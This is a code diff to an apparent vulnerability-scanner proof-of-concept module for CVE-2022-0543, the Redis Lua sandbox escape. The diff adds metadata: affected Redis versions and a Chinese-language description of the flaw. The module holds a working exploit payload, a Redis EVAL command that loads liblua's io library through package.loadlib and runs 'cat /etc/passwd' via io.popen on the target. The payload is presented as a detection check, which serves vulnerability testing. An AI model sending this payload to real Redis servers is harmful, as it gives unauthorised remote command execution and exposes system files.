@@ -19,12 +19,17 @@ class POC(POCBase):
         """,  # POC描述，写更新描述，没有就不写
 
         "name": "Redis Lua 沙箱逃逸和远程代码执行 (CVE-2022-0543)",  # 漏洞名称
-        "VulnID": "oFx-2022-0001",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName": "",  # 漏洞应用名称
-        "AppVersion": "",  # 漏洞应用版本
+        "VulnID": "CVE-2022-0543",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName": "Redis",  # 漏洞应用名称
+        "AppVersion": """
+            2.2 <= redis < 5.0.13
+            2.2 <= redis < 6.0.15
+            2.2 <= redis < 6.2.5
+        """,  # 漏洞应用版本
         "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc": """
-        
+            Redis 存在代码注入漏洞，攻击者可利用该漏洞远程执行代码。
+            Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。
         """,  # 漏洞简要描述
 
         "fofa-dork": """
@@ -52,8 +57,9 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             ss.settimeout(10)
-            ss.connect((ip,port))
-            ss.send('eval \'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /etc/passwd", "r"); local res = f:read("*a"); f:close(); return res\' 0 \r\n'.encode())
+            ss.connect((ip, port))
+            ss.send(
+                'eval \'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /etc/passwd", "r"); local res = f:read("*a"); f:close(); return res\' 0 \r\n'.encode())
             data = ss.recv(10240).decode()
             if "root:/root" in data:  # req.status_code == 200 and :
                 vuln = [True, data]
